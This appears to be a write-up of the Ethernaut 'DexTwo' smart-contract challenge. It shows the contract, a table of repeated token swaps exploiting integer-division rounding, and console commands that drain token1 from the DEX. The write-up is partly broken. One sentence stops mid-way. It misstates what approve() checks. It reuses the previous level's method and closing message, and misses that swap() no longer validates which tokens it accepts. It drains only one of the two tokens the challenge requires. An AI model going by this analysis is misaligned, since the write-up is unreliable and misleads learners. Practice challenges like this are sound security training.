
<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Challemge's message:

> This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level. You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

The DexTwo contract is a decentralized exchange ([DEX](https://en.wikipedia.org/wiki/Decentralized_finance)) contract that allows for swapping between two tokens and adding liquidity to the DEX. The contract uses the OpenZeppelin library for ERC20 token standards and ownership functionality.


The `DexTwo` contract is a simple DEX that allows the owner to set two tokens for trading, add liquidity, and perform token swaps.

- `setTokens()`: This function allows the contract owner to set the two tokens that will be traded on the DEX.

- `addLiquidity()`: This function allows the contract owner to add liquidity to the DEX.

- `swap()`: This function allows users to swap tokens. The user must have enough balance of the `from` token to perform the swap.

- `getSwapAmount()`: This function calculates the swap price based on the liquidity pool balances.

- `approve()`: This function approves the `spender` to spend a certain `amount` of tokens on behalf of the user.

- `balanceOf()`: This function returns the balance of a specific token for a specific account.


The `SwappableTokenTwo` contract is an ERC20 token that can be swapped on the DEX.

- `approve()`: This function allows the `owner` to approve the `spender` to spend a certain `amount` of tokens on their behalf. However, the `spender` can't be the DEX contract itself.



# Subverting

This challenge is quite similar to **Dex** challenge. The same logic is valid. However, it is good to remember what was happing in the previous challenge. In solidity, mathematical processes are between integers values so the result of this process must be an integer. That's why, it doesn't get fractions. For example, `5 / 2 = 2` in solidity. 

When we look at the contract, it calculate the swap price with division of `(amount * IERC20(to).balanceOf(address(this))` and `IERC20(from).balanceOf(address(this))` values. After calculating the swap price, it uses this value as swappable tokens count. In this case, it may swaps more than enough balance. 

The difference of the dexTwo challenge is, there is no 

Let's explain this issue with example! 

We're going to swap all of our token1 for token2. Then swap all our token2 to token1, then swap all our token1 for token2 and continue.

```
      DEX       |      player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10 
```

After swapping all of token1 the table looks like:

```
      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20 
```

Note that at this point exchange rate is adjusted. Now, exchanging 20 token2 should give **20 * 110 / 90 = 24.44...** But since division results in integer we get **24 token2**. Price adjusts again. Swap again.

```
      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0
```

Then, keep swapping the tokens. Here is table of during process.

```
      DEX       |     player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0    
  110     80    |   0       30    
  69      110   |   41      0    
  110     45    |   0       65 
```

At this point, at the last swap above we've gotten hold of 65 token2, which is more than enough to drain all of 110 token1! By simple calculation, only 45 of token2 is required to get all 110 of token1. 

```
      DEX       |     player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0    
  110     80    |   0       30    
  69      110   |   41      0    
  110     45    |   0       65   
  0       90    |   110     20
```

We understand how to drain all token1. Let's jump the console and pass the challenge!

Get the token addresses.

```js
var token1 = await contract.token1()
```

```js
var token2 = await contract.token2()
```

Check our balance in token1 and token2. 

```js
await contract.balanceOf(token1,player)
i {negative: 0, words: Array(2), length: 1, red: null}
length
: 
1
negative
: 
0
red
: 
null
words
: 
(2) [10, empty]
[[Prototype]]
: 
Object
```

```js
await contract.balanceOf(token2,player)
i {negative: 0, words: Array(2), length: 1, red: null}
length
: 
1
negative
: 
0
red
: 
null
words
: 
(2) [10, empty]
[[Prototype]]
: 
Object
```

Check the contract's balance in token1. 

```js
await contract.balanceOf(token1, instance).then(x => x.toString())

'100'
```

To exploit this, we should approve to the target contract while this swapping process.

```js
await contract.approve(instance, 500)
```

After then, start to swapping tokens one by one and drain all token1 tokens in the DEX.

```js
await contract.swap(token1, token2, 10)
await contract.swap(token2, token1, 20)
await contract.swap(token1, token2, 24)
await contract.swap(token2, token1, 30)
await contract.swap(token1, token2, 41)
await contract.swap(token2, token1, 45)
```

Finally, check the contract's balance in token1. As you see, we drain all token1 in the dex contract!

```js
await contract.balanceOf(token1, instance).then(x => x.toString())

'0'
```

Ethernaut's message:

> The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts. You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.
The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset's price in case a specific dex is targeted by an attack like this.


**_by wasny0ps_**
